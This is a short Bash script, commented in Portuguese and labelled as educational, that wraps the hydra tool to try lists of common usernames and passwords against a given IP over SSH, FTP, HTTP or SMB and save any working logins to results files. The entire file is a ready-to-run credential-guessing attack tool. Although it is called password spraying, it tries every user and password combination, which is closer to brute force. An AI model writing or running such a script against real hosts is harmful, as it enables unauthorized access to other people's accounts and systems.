#!/bin/bash

# Script de Password Spraying Educacional
# Uso: ./password_spraying.sh <target_ip> <protocol>

echo "=== SIMULAÇÃO DE PASSWORD SPRAYING ==="
echo "Target: $1"
echo "Protocol: $2"
echo ""

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: ./password_spraying.sh <IP> <protocolo>"
    echo "Protocolos suportados: ssh, ftp, http, smb"
    exit 1
fi

TARGET=$1
PROTOCOL=$2
USER_FILE="wordlists/common_users.txt"
PASS_FILE="wordlists/common_passwords.txt"

echo "[+] Iniciando ataque de password spraying..."
echo "[+] Alvo: $TARGET"
echo "[+] Protocolo: $PROTOCOL"
echo ""

case $PROTOCOL in
    "ssh")
        hydra -L $USER_FILE -P $PASS_FILE ssh://$TARGET -t 4 -W 3 -o results/ssh_results.txt
        ;;
    "ftp")
        hydra -L $USER_FILE -P $PASS_FILE ftp://$TARGET -t 4 -W 3 -o results/ftp_results.txt
        ;;
    "http")
        hydra -L $USER_FILE -P $PASS_FILE http-get://$TARGET -t 4 -W 3 -o results/http_results.txt
        ;;
    "smb")
        hydra -L $USER_FILE -P $PASS_FILE smb://$TARGET -t 4 -W 3 -o results/smb_results.txt
        ;;
    *)
        echo "Protocolo não suportado: $PROTOCOL"
        exit 1
        ;;
esac

echo "[+] Ataque concluído. Verifique o arquivo de resultados."
